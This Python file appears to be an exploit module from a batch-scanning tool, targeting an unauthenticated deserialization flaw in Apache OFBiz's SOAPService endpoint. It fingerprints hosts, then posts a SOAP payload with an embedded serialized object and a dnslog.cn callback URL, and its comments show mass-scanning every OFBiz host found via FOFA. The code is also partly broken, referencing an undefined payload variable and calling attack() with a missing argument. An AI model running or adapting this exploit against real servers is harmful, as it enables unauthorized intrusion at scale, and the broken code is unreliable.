# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-14 13:40
import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: app="Apache_OFBiz"
# python batch.py -m exploit.web.Apache.OFBiz.unauth_rce -cs -fs "app=\"Apache_OFBiz\""

class Script(BaseScript):
    name = 'Apache-OFBiz'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.DESERIALIZE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/webtools/control/SOAPService']
        # exec
        self.execPathList = ['/webtools/control/SOAPService']
        # session
        self.session = session
        # 相关信息
        self.info = 'version < 17.12.06'
        self.favicon = ['d53142ec793716adfab24e5898971f77']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'ofbiz.apache.org' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('OFBiz Finger', url))
                            return {'name': 'OFBiz Finger', 'url': url, 'software': 'OFBiz'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'text/xml'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                derserilizeData
                data = """
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">  
                  <soapenv:Header/>  
                  <soapenv:Body>
                    <ser>
                      <map-Map>
                        <map-Entry>
                          <map-Key>
                            <cus-obj>{}</cus-obj>
                          </map-Key>  
                          <map-Value>  
                            <std-String value="http://7mlsh5.dnslog.cn"/>
                          </map-Value>
                        </map-Entry>
                      </map-Map>
                    </ser>
                  </soapenv:Body>
                </soapenv:Envelope>
                    """.format(derserilizeData)
                async with self.session.post(url=url, headers=headers, timeout=self.reqTimeout, data=data, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        await asyncio.sleep(2)
                        tqdm.write(Fore.RED + '[{}] {}'.format('OFBiz Deserialize', url))
                        return {'name': 'OFBiz Deserialize', 'url': url, 'software': 'OFBiz'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://192.168.4.137:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    semaphore = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8443', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))


